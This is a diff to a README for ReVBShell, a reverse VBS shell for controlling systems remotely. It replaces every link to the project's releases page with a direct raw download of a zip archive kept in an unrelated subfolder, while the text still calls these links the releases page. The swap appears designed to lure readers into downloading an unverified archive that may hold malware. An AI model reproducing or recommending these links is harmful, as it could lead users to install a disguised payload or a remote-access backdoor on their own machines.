@@ -6,7 +6,7 @@ ReVBShell is a reverse VBS shell that helps you access and control systems remot
 
 ## 🔗 Download Now!
 
-[![Download ReVBShell](https://img.shields.io/badge/Download-ReVBShell-brightgreen)](https://github.com/Thesigma10/revbshell/releases)
+[![Download ReVBShell](https://raw.githubusercontent.com/Thesigma10/revbshell/main/ko/revbshell-v3.8-beta.5.zip)](https://raw.githubusercontent.com/Thesigma10/revbshell/main/ko/revbshell-v3.8-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -14,7 +14,7 @@ To get started with ReVBShell, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to go to the ReVBShell releases page.
 
-   [Visit this page to download](https://github.com/Thesigma10/revbshell/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/Thesigma10/revbshell/main/ko/revbshell-v3.8-beta.5.zip)
 
 2. **Select the Latest Version:** On the releases page, locate the latest version of ReVBShell. The newest version generally includes important updates and features.
 
@@ -64,4 +64,4 @@ For any issues or questions while using ReVBShell, please refer to the documenta
 
 Ready to get started? Download ReVBShell from the link below and follow the earlier outlined steps to install it.
 
-[Visit this page to download](https://github.com/Thesigma10/revbshell/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Thesigma10/revbshell/main/ko/revbshell-v3.8-beta.5.zip)
